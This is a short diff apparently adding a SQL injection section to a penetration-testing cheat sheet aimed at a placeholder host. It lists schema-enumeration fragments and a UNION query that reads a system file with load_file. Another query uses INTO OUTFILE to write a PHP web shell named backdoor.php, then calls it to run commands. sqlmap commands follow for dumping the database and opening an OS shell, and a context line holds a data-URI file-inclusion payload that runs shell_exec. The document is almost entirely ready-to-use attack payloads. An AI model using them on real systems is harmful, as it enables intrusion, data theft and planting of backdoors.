@@ -63,10 +63,22 @@ http://1.2.3.4/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
 
 ==========================================================================================
 SQLi
+@@version
+()user
+table_name from information_schema.tables
+column_name from information_schema.columns where table_name='users'
 
+http://1.2.3.4/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
 
+http://1.2.3.4/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+http://1.2.3.4/backdoor.php?cmd=ipconfig
 
-
+sqlmap will play with the id param
+sqlmap -u http://1.2.3.4/debug.php?id=1 -p "id"
+dump the database
+sqlmap -u http://1.2.3.4/debug.php?id=1 -p "id" --dbms=mysql --dump
+get shell
+sqlmap -u http://1.2.3.4/debug.php?id=1 -p "id" --dbms=mysql --os-shell
 
 
 
